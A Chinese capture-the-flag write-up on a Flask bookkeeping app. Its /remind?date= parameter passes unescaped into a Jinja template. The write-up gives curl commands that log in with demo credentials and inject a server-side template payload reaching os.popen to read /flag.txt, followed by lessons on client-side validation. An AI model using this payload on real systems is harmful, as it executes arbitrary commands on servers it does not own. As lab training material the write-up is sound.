## 题解

### 入口与指纹

Flask（`Werkzeug/3.0.6` + Python 3.8.17），登录页 `/login`，登录后
`/transactions`（记账列表）、`/add_transaction`、`/remind?date=`、`/logout`。

登录页没有注册入口，但演示口令 `user:user` 可用（`admin:admin` 不行）。

### 关键观察

**1. `/transactions` 的「Remind」按钮把日期直接拼进 `/remind?date=`。**

页面 JS：

```js
if (!dateInput.match(/^\d{4}-\d{2}-\d{2}$/)) { ... }
else { window.location.href = `/remind?date=${dateInput}`; }
```

前端有格式校验，但**服务端不校验**，直接 `?date=` 拿过来。

**2. `/remind` 把 `date` 拼进模板渲染。**

```text
GET /remind?date={{7*7}}
→ Reminder will be sent on 49
```

**3. 记账字段（name/email）是转义的，不是注入点。**

提交 `<script>` 会显示成 `&lt;script&gt;`；真正没转义的是 `date`。

### 利用链

```bash
T=$(head -1 .target)
cj=$(mktemp)
curl -s -c $cj -b $cj -d 'username=user&password=user' "http://$T/login"
curl -s -b $cj -G \
  --data-urlencode "date={{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}" \
  "http://$T/remind" | grep -o 'flag{[^}]*}'
```

flag 在容器根目录 `/flag.txt`。

### flag 位置

`/remind` 的渲染结果（`alert-info` 区块内）。

## 复盘

- **前端校验不算校验。** 这里的正则只在浏览器里跑，直接构造 URL 就能绕过。
- **一个页面有多个参数时，逐个试模板语法。** 记账字段被转义，`date` 没有；
  `{{7*7}}` 一次就能分辨。
- `config.__class__.__init__.__globals__['os']` 比 `cycler` 更短，且不依赖 `cycler` 是否在上下文里。
